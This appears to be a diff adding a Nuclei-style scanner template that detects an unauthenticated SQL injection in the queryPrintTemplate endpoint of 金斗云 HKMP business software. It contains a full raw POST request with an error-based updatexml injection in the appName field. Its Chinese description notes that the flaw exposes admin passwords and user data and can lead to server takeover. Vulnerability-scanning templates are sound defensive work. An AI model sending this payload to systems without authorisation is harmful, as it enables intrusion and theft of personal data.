@@ -1,0 +1,31 @@
+id: jdy-hkmp-queryprinttemplate-sqli
+
+info:
+  name: 金斗云HKMP queryPrintTemplate - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    金斗云 HKMP智慧商业软件 queryPrintTemplate 接口存在SQL注入漏洞，未经身份验证的远程攻击者可利用漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  tags: 金斗云HKMP智慧商业软件
+
+variables:
+  s1: "{{rand_int(100000, 200000)}}"
+
+http:
+  - raw:
+      - |
+        POST /admin/configApp/queryPrintTemplate HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"appId":"hkmp","data":{"adminUserCode":"test1234","adminUserName":"test1234","appName":"1' and updatexml(1,concat(0x7e,(select md5({{s1}})),0x7e),1) AND '123'='123","configGroup":"1","mchId":"0001"},"deviceId":"hkmp","mchId":"hkmp","nonce":3621722933,"sign":"hkmp","timestamp":1719306504}
+    
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "~([a-f0-9]{32})~"
+        part: body
+      - type: dsl
+        dsl:
+          - "contains(body, substr(md5(s1), 1, 32))"
